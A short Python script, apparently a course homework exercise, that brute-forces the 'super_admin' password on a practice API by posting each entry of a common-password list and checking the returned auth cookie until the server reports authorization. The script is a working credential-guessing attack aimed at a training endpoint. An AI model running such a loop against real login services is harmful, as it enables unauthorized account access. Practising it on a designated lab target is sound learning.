import requests
import json

url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url2 = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
login = 'super_admin'
common_passwords = [
    "password", "123456", "12345678", "qwerty", "abc123", "monkey", "1234567",
    "letmein", "trustno1", "dragon", "baseball", "111111", "iloveyou", "master",
    "sunshine", "ashley", "bailey", "passw0rd", "shadow", "123123", "654321",
    "superman", "qazwsx", "michael", "Football", "password", "123456", "12345678",
    "abc123", "qwerty", "monkey", "letmein", "dragon", "111111", "baseball",
    "iloveyou", "trustno1", "1234567", "sunshine", "master", "123123", "welcome",
    "shadow", "ashley", "football", "jesus", "michael", "ninja", "mustang",
    "password1", "123456", "password", "12345678", "qwerty", "abc123",
    "123456789", "111111", "1234567", "iloveyou", "adobe123", "123123",
    "admin", "1234567890", "letmein", "photoshop", "1234", "monkey", "shadow",
    "sunshine", "12345", "password1", "princess", "azerty", "trustno1",
    "000000", "123456", "password", "12345", "12345678", "qwerty", "123456789",
    "1234", "baseball", "dragon", "football", "1234567", "monkey", "letmein",
    "abc123", "111111", "mustang", "access", "shadow", "master", "michael",
    "superman", "696969", "batman", "trustno1", "000000", "123456", "password",
    "12345678", "qwerty", "12345", "123456789", "football", "1234", "1234567",
    "baseball", "welcome", "1234567890", "abc123", "111111", "1qaz2wsx",
    "dragon", "master", "letmein", "monkey", "login", "princess", "qwertyuiop",
    "solo", "passw0rd", "starwars", "123456", "password", "12345", "12345678",
    "football", "1234567890", "1234567", "princess", "1234", "welcome", "login",
    "abc123", "111111", "121212", "dragon", "passw0rd", "master", "sunshine",
    "flower", "hottie", "loveme", "zaq1zaq1", "password1", "123qwe", "000000",
    "123456", "password", "12345678", "password", "123456789", "qwerty",
    "12345678", "12345", "1234567", "111111", "12345", "123123", "sunshine",
    "iloveyou", "abc123", "qwerty123", "000000", "1q2w3e", "aa12345678",
    "abc123", "password1", "1234", "qwertyuiop", "123321", "password123"
]
passwords = list(dict.fromkeys(common_passwords))
for password in passwords:
    response = requests.post(url, data={"login": login,"password": password})
    print(response.text)
    cookie_value = response.cookies.get("auth_cookie")
    print(f"Cookie value is {cookie_value}")
    response2 = requests.post(url2, cookies={"auth_cookie": cookie_value})
    if response2.text == "You are authorized":
        print(f"BINGO! Correct password is {password} and response text is {response2.text}")
        break
    elif response2.text == "You are NOT authorized":
        print(f"Password is incorrect and response text is {response2.text}")

    else:
        print("Error, not expected response text")